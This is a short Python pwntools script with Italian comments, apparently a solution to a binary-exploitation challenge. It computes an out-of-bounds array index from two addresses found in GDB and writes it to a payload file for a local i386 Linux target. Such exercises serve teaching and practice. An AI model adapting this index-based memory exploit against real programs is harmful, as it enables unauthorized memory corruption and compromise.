from pwn import *
context.arch='i386' 
context.os='linux'

# Indirizzi trovati in GDB
p_addr = 0xffffcffc
ptrs_addr = 0x56559094

# Calcoliamo la distanza e l'indice
addr = p_addr - ptrs_addr
addr //= 4

payload = str(addr).encode() + b"\n"

with open("./payload_challenge_extra3", "wb") as f: 
    f.write(payload)

print(f"[+] Payload generato con successo! Contenuto: {payload}")